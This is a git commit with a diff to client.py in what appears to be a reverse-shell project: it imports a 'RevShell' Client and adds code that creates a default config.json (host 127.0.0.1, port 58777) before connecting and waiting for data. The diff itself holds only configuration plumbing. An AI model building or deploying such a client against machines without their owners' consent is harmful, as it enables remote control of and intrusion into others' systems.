7b78764faa4926e7184bcb9f85bb286cf6836311
Gerard Balaoro <miogerard@yahoo.com>
2018-11-18 23:50:21 +0800

    Automatically create config.json

--- client.py
+++ client.py
@@ -1,8 +1,12 @@
 from RevShell import Client
-import json
+import json, os.path
 
 if __name__ == '__main__':
-    server = json.loads(open('server.json', 'r').read())
+    if not os.path.isfile('config.json'):
+        config = open('config.json', 'w')
+        config.write(json.dumps({'host': '127.0.0.1', 'port': 58777}, sort_keys = True))
+
+    server = json.loads(open('config.json', 'r').read())
     client = Client(server['host'], server['port'])
     client.connect()
     client.receive()
